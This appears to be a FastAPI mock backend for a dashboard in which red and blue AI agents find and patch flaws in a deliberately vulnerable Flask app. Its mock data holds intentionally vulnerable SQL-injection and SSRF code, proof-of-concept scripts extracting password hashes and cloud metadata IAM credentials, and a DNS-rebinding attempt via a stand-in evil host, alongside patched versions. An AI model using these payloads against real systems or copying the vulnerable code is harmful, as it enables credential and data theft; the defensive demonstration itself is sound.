import os
import json
import asyncio
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Optional, Any

app = FastAPI(title="Openwing Janus API", version="0.4.1-rc")

# ── Mock Data ─────────────────────────────────────────────────────────────

MOCK_REPO = {
    "url": "github.com/openwing-labs/vuln-flask-app",
    "name": "vuln-flask-app",
    "owner": "openwing-labs",
    "branch": "main",
    "commit": "a4c91f2",
    "language": "Python",
    "files": 47,
    "loc": 2814,
    "size": "1.2 MB",
}

MOCK_FILETREE = [
    {"path": "app/__init__.py", "loc": 22, "status": "clean"},
    {"path": "app/auth.py", "loc": 84, "status": "clean"},
    {"path": "app/db.py", "loc": 56, "status": "flagged"},
    {"path": "app/routes/users.py", "loc": 142, "status": "critical"},
    {"path": "app/routes/proxy.py", "loc": 98, "status": "critical"},
    {"path": "app/routes/admin.py", "loc": 73, "status": "clean"},
    {"path": "app/utils/sanitize.py", "loc": 31, "status": "clean"},
    {"path": "app/templates/login.html", "loc": 18, "status": "clean"},
    {"path": "config.py", "loc": 26, "status": "flagged"},
    {"path": "requirements.txt", "loc": 12, "status": "clean"},
    {"path": "tests/test_users.py", "loc": 64, "status": "clean"},
]

MOCK_SWEEP = [
    {"path": "app/routes/users.py", "loc": 142, "agent": "red", "state": "critical", "findings": 1, "time": 5800},
    {"path": "app/routes/proxy.py", "loc": 98, "agent": "red", "state": "critical", "findings": 1, "time": 7200},
    {"path": "app/routes/admin.py", "loc": 73, "agent": "red", "state": "clean", "findings": 0, "time": 4100},
    {"path": "app/auth.py", "loc": 84, "agent": "red", "state": "clean", "findings": 0, "time": 3900},
    {"path": "app/db.py", "loc": 56, "agent": "red", "state": "clean", "findings": 0, "time": 3200},
    {"path": "app/utils/sanitize.py", "loc": 31, "agent": "red", "state": "clean", "findings": 0, "time": 2400},
    {"path": "app/templates/login.html", "loc": 18, "agent": "red", "state": "clean", "findings": 0, "time": 1900},
    {"path": "config.py", "loc": 26, "agent": "red", "state": "fp", "findings": 1, "time": 4600},
]

MOCK_FINDINGS = [
    {
        "id": "JNS-001",
        "title": "SQL Injection via unsanitized search query",
        "severity": "critical", "cvss": 9.1, "cwe": "CWE-89",
        "file": "app/routes/users.py", "line": 14, "function": "search_users",
        "vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "The /api/users/search endpoint interpolates the user-controlled `q` parameter directly into a SQL statement using an f-string, with no parameterization or escaping. An attacker can break out of the LIKE clause and chain a UNION query to exfiltrate arbitrary tables — including password hashes from the users table.",
        "impact": ["Full read access to the application database", "Disclosure of all user credentials (bcrypt hashes)", "Potential write/delete via stacked queries depending on driver"],
        "discoveredAt": 5950, "patchedAt": 10550, "verifiedAt": 14000,
        "vulnCode": "from flask import Blueprint, request, jsonify\nfrom app.db import get_conn\n\nbp = Blueprint(\"users\", __name__)\n\n@bp.route(\"/api/users/search\")\ndef search_users():\n    \"\"\"Search users by username substring.\"\"\"\n    q = request.args.get(\"q\", \"\")\n    conn = get_conn()\n    cur = conn.cursor()\n\n    # FIXME: refactor before launch — direct interpolation\n    sql = f\"SELECT id, username, email FROM users WHERE username LIKE '%{q}%'\"\n    cur.execute(sql)\n\n    rows = cur.fetchall()\n    return jsonify([dict(r) for r in rows])",
        "patchedCode": "from flask import Blueprint, request, jsonify\nfrom app.db import get_conn\n\nbp = Blueprint(\"users\", __name__)\n\n@bp.route(\"/api/users/search\")\ndef search_users():\n    \"\"\"Search users by username substring.\"\"\"\n    q = request.args.get(\"q\", \"\")\n    if len(q) > 64:\n        return jsonify({\"error\": \"query too long\"}), 400\n\n    conn = get_conn()\n    cur = conn.cursor()\n\n    # Parameterized query — driver handles escaping\n    sql = \"SELECT id, username, email FROM users WHERE username LIKE ?\"\n    cur.execute(sql, (f\"%{q}%\",))\n\n    rows = cur.fetchall()\n    return jsonify([dict(r) for r in rows])",
        "poc": "#!/usr/bin/env python3\n\"\"\"\nPoC: SQL Injection in /api/users/search\n\"\"\"\nimport requests, json\n\nTARGET = \"http://localhost:5000\"\nPAYLOAD = \"' UNION SELECT id,username,password_hash FROM users-- \"\n\ndef run():\n    r = requests.get(f\"{TARGET}/api/users/search\",\n                     params={\"q\": PAYLOAD})\n    rows = r.json()\n    print(f\"[+] Extracted {len(rows)} rows\")\n    for row in rows[:5]:\n        print(f\"    {row}\")\n\nif __name__ == \"__main__\":\n    run()",
    },
    {
        "id": "JNS-002",
        "title": "Server-Side Request Forgery in proxy endpoint",
        "severity": "critical", "cvss": 8.6, "cwe": "CWE-918",
        "file": "app/routes/proxy.py", "line": 11, "function": "fetch",
        "vector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
        "description": "The /api/fetch endpoint takes a user-supplied URL and issues a server-side HTTP request without validating the scheme or destination host. An attacker can pivot through the application server to access internal services and the cloud metadata endpoint, exfiltrating IAM credentials.",
        "impact": ["Read access to internal-only HTTP services", "Disclosure of cloud IAM credentials via metadata endpoint", "Reconnaissance of internal network topology"],
        "discoveredAt": 7250, "patchedAt": 12550, "verifiedAt": 15000,
        "vulnCode": "from flask import Blueprint, request, Response\nimport requests\n\nbp = Blueprint(\"proxy\", __name__)\n\n@bp.route(\"/api/fetch\")\ndef fetch():\n    \"\"\"Fetch and return content from a remote URL.\"\"\"\n    url = request.args.get(\"url\")\n    if not url:\n        return {\"error\": \"url required\"}, 400\n\n    # FIXME: validate url scheme + host before fetching\n    resp = requests.get(url, timeout=5)\n    return Response(resp.content,\n                    content_type=resp.headers.get(\"content-type\"))",
        "patchedCode": "from flask import Blueprint, request, Response\nfrom urllib.parse import urlparse\nimport ipaddress, socket, requests\n\nbp = Blueprint(\"proxy\", __name__)\n\nALLOWED_SCHEMES = {\"http\", \"https\"}\nDENIED_HOSTS = {\"localhost\", \"metadata.google.internal\"}\n\ndef _is_safe(url: str) -> bool:\n    p = urlparse(url)\n    if p.scheme not in ALLOWED_SCHEMES: return False\n    host = p.hostname or \"\"\n    if host in DENIED_HOSTS: return False\n    try:\n        ip = ipaddress.ip_address(socket.gethostbyname(host))\n        if ip.is_private or ip.is_loopback or ip.is_link_local:\n            return False\n    except (socket.gaierror, ValueError):\n        return False\n    return True\n\n@bp.route(\"/api/fetch\")\ndef fetch():\n    url = request.args.get(\"url\")\n    if not url or not _is_safe(url):\n        return {\"error\": \"invalid url\"}, 400\n\n    resp = requests.get(url, timeout=5, allow_redirects=False)\n    return Response(resp.content,\n                    content_type=resp.headers.get(\"content-type\"))",
        "poc": "#!/usr/bin/env python3\n\"\"\"\nPoC: SSRF in /api/fetch\n\"\"\"\nimport requests\n\nTARGET = \"http://localhost:5000\"\nMETADATA = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\ndef run():\n    r = requests.get(f\"{TARGET}/api/fetch\",\n                     params={\"url\": METADATA})\n    print(\"[+] Cloud metadata response:\")\n    print(r.text[:300])\n\nif __name__ == \"__main__\":\n    run()",
    },
    {
        "id": "JNS-003",
        "title": "Insecure default for DEBUG flag",
        "severity": "info", "cvss": 0.0, "cwe": "CWE-1188",
        "file": "config.py", "line": 8, "function": "<module>",
        "vector": "AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:N",
        "description": "The DEBUG configuration falls back to True if the DEBUG env var is unset. Janus_Red reviewed the deploy pipeline and found that the production Dockerfile explicitly sets DEBUG=False, so this is reachable only in misconfigured environments.",
        "impact": ["Stack traces shown to end users in error pages (only if env unset)"],
        "discoveredAt": 7700, "patchedAt": None, "verifiedAt": None,
        "triage": "false-positive",
        "vulnCode": "DEBUG = os.getenv(\"DEBUG\", True)\n", "patchedCode": None, "poc": None,
    },
]

MOCK_TRACE = [
  {"agent": "system", "t": 0,    "line": "── bootstrapping CrewAI orchestrator ──"},
  {"agent": "system", "t": 220,  "line": "spawning vLLM endpoint @ rocm0:8000 · Qwen3.5-9B · ctx=256k"},
  {"agent": "system", "t": 580,  "line": "roles: Janus_Red [offense] · Janus_Blue [defense]"},
  {"agent": "system", "t": 820,  "line": "cloning github.com/openwing-labs/vuln-flask-app @ a4c91f2"},
  {"agent": "red",    "t": 1100, "line": "OK. Ingesting 47 files · 2,814 LOC."},
  {"agent": "red",    "t": 1450, "line": "Flask app. Looking for: input → execution sinks."},
  {"agent": "red",    "t": 1900, "line": "Tracing request.args / request.form / request.json across routes/*"},
  {"agent": "red",    "t": 2400, "line": "→ app/routes/users.py:14 — request.args.get(\"q\") flows into SQL string."},
  {"agent": "red",    "t": 2900, "line": "Sink uses f-string interpolation. No parameterization."},
  {"agent": "red",    "t": 3300, "kind": "thought", "line": "Hypothesis: classical SQLi. Try UNION extract."},
  {"agent": "red",    "t": 3700, "line": "Crafting payload …"},
  {"agent": "red",    "t": 4100, "kind": "code", "line": "q = \"' UNION SELECT id,username,password_hash FROM users-- \""},
  {"agent": "red",    "t": 4600, "line": "Spinning sandboxed Flask runtime → :5000"},
  {"agent": "red",    "t": 5100, "kind": "shell", "line": "python poc_sqli.py"},
  {"agent": "red",    "t": 5500, "kind": "output", "line": "[+] Extracted 142 rows"},
  {"agent": "red",    "t": 5700, "kind": "output", "line": "    {'id': 1, 'username': 'alice', 'password_hash': '$2b$12$…'}"},
  {"agent": "red",    "t": 5800, "kind": "output", "line": "    {'id': 2, 'username': 'bob',   'password_hash': '$2b$12$…'}"},
  {"agent": "red",    "t": 5950, "line": "CONFIRMED — exfiltration possible. Writing finding JNS-001."},
  {"agent": "red",    "t": 6100, "line": "→ app/routes/proxy.py:11 — request.args.get(\"url\") fed to requests.get()"},
  {"agent": "red",    "t": 6300, "line": "No scheme/host validation. SSRF candidate."},
  {"agent": "red",    "t": 6500, "kind": "thought", "line": "Try metadata endpoint pivot: 169.254.169.254"},
  {"agent": "red",    "t": 6800, "kind": "shell", "line": "python poc_ssrf.py"},
  {"agent": "red",    "t": 7100, "kind": "output", "line": "[+] Cloud metadata response: AccessKeyId=ASIA…"},
  {"agent": "red",    "t": 7250, "line": "CONFIRMED — IAM credential exfiltration. Writing finding JNS-002."},
  {"agent": "red",    "t": 7400, "line": "→ config.py:8 — DEBUG = os.getenv(\"DEBUG\", True)"},
  {"agent": "red",    "t": 7700, "kind": "thought", "line": "Hard-coded default-true is a smell, but not exploitable in prod env. Marking as LOW / false-positive candidate."},
  {"agent": "system", "t": 7900, "line": "↳ findings/ · JNS-001 (critical) · JNS-002 (critical) · JNS-003 (info)"},
  {"agent": "system", "t": 8100, "line": "handoff → Janus_Blue · 2 patches required"},
  {"agent": "blue",   "t": 8400, "line": "Received 2 findings. Reviewing JNS-001."},
  {"agent": "blue",   "t": 8800, "line": "Vector: untrusted q in f-string. Standard fix: parameterize."},
  {"agent": "blue",   "t": 9200, "kind": "thought", "line": "Need to preserve LIKE wildcard semantics. Build \"%\" + q + \"%\" as a parameter, not in SQL."},
  {"agent": "blue",   "t": 9600, "line": "Adding length guard (64 chars) for pathological inputs."},
  {"agent": "blue",   "t": 10000, "line": "Patch ready. Running test suite …"},
  {"agent": "blue",   "t": 10400, "kind": "output", "line": "tests/test_users.py ........ 8 passed in 0.42s"},
  {"agent": "blue",   "t": 10550, "line": "Patch applied to app/routes/users.py"},
  {"agent": "blue",   "t": 10800, "line": "Reviewing JNS-002 (SSRF)."},
  {"agent": "blue",   "t": 11100, "kind": "thought", "line": "Need allow-list of schemes + DNS resolution check + private/loopback IP block."},
  {"agent": "blue",   "t": 11500, "line": "Drafting _is_safe() helper using urllib.parse + ipaddress + socket."},
  {"agent": "blue",   "t": 12000, "line": "Disabling redirect-following (allow_redirects=False) to prevent bypass."},
  {"agent": "blue",   "t": 12400, "kind": "output", "line": "tests/test_proxy.py ...... 6 passed in 0.28s"},
  {"agent": "blue",   "t": 12550, "line": "Patch applied to app/routes/proxy.py"},
  {"agent": "system", "t": 12750, "line": "verification loop · turn 2 → Janus_Red"},
  {"agent": "red",    "t": 13000, "line": "Re-running PoC suite against patched build …"},
  {"agent": "red",    "t": 13300, "kind": "shell", "line": "python poc_sqli.py"},
  {"agent": "red",    "t": 13550, "kind": "output", "line": "[+] Extracted 0 rows"},
  {"agent": "red",    "t": 13700, "line": "Trying bypass: payload-encoded LIKE wildcards …"},
  {"agent": "red",    "t": 14000, "kind": "output", "line": "[+] Extracted 0 rows"},
  {"agent": "red",    "t": 14200, "kind": "shell", "line": "python poc_ssrf.py"},
  {"agent": "red",    "t": 14500, "kind": "output", "line": "[!] HTTP 400 — invalid url"},
  {"agent": "red",    "t": 14700, "line": "Trying DNS rebinding: dns.evil.com → 169.254.169.254 …"},
  {"agent": "red",    "t": 15000, "kind": "output", "line": "[!] HTTP 400 — invalid url"},
  {"agent": "red",    "t": 15200, "line": "Both patches hold. Marking JNS-001 + JNS-002 as RESOLVED."},
  {"agent": "system", "t": 15500, "line": "✓ run complete · duration 15.5s · cost $0.0214"}
]

MOCK_HISTORY = [
    {"id": "run_5b2a", "repo": "vuln-flask-app",          "when": "2 min ago",  "status": "resolved",  "findings": 2, "fixed": 2, "dur": "15.5s", "cost": "$0.021"},
    {"id": "run_5b29", "repo": "sketchy-microservice",    "when": "14 min ago", "status": "resolved",  "findings": 3, "fixed": 3, "dur": "38.2s", "cost": "$0.061"},
    {"id": "run_5b28", "repo": "internal/payments-api",   "when": "1 h ago",    "status": "partial",   "findings": 4, "fixed": 2, "dur": "1m 04s","cost": "$0.114"},
    {"id": "run_5b27", "repo": "internal/billing",        "when": "3 h ago",    "status": "resolved",  "findings": 2, "fixed": 2, "dur": "22.0s", "cost": "$0.039"},
    {"id": "run_5b26", "repo": "oss/htmx-fork",           "when": "Yesterday",  "status": "clean",     "findings": 0, "fixed": 0, "dur": "7.3s",  "cost": "$0.008"},
    {"id": "run_5b25", "repo": "internal/risk-engine",    "when": "Yesterday",  "status": "failed",    "findings": 0, "fixed": 0, "dur": "3.2s",  "cost": "$0.003"},
    {"id": "run_5b24", "repo": "oss/lite-orm",            "when": "2 d ago",    "status": "partial",   "findings": 6, "fixed": 4, "dur": "2m 11s","cost": "$0.231"},
    {"id": "run_5b23", "repo": "internal/auth-svc",       "when": "2 d ago",    "status": "resolved",  "findings": 1, "fixed": 1, "dur": "14.5s", "cost": "$0.018"},
    {"id": "run_5b22", "repo": "oss/feedparse",           "when": "3 d ago",    "status": "clean",     "findings": 0, "fixed": 0, "dur": "5.8s",  "cost": "$0.006"},
]

MOCK_SYSTEM = {
    "gpu":      {"name": "AMD Instinct MI300X", "util": 67, "mem": "142 / 192 GB", "temp": "62°C"},
    "endpoint": {"url": "rocm0:8000", "model": "Qwen3.5-9B", "tok_s": 184, "ctx": "24,892 / 262,144"},
    "budget":   {"spent": 12.84, "total": 100.00},
}

# ── Endpoints ─────────────────────────────────────────────────────────────

@app.get("/api/repo")
def get_repo():
    return MOCK_REPO

@app.get("/api/filetree")
def get_filetree():
    return MOCK_FILETREE

@app.get("/api/sweep")
def get_sweep():
    return MOCK_SWEEP

@app.get("/api/findings")
def get_findings():
    return MOCK_FINDINGS

@app.get("/api/history")
def get_history():
    return MOCK_HISTORY

@app.get("/api/system")
def get_system():
    return MOCK_SYSTEM

@app.get("/api/trace")
def get_trace():
    return MOCK_TRACE

# Note: Streaming endpoint for SSE could be implemented like this:
# @app.get("/api/runs/{run_id}/events")
# async def stream_events(run_id: str):
#     async def event_generator():
#         for entry in MOCK_TRACE:
#             yield f"data: {json.dumps(entry)}\n\n"
#             await asyncio.sleep(0.1) # Simulate delay
#     return StreamingResponse(event_generator(), media_type="text/event-stream")

# Mount frontend directory for static serving
# Ensure the 'frontend' directory exists relative to where you run uvicorn
app.mount("/", StaticFiles(directory="frontend", html=True), name="frontend")
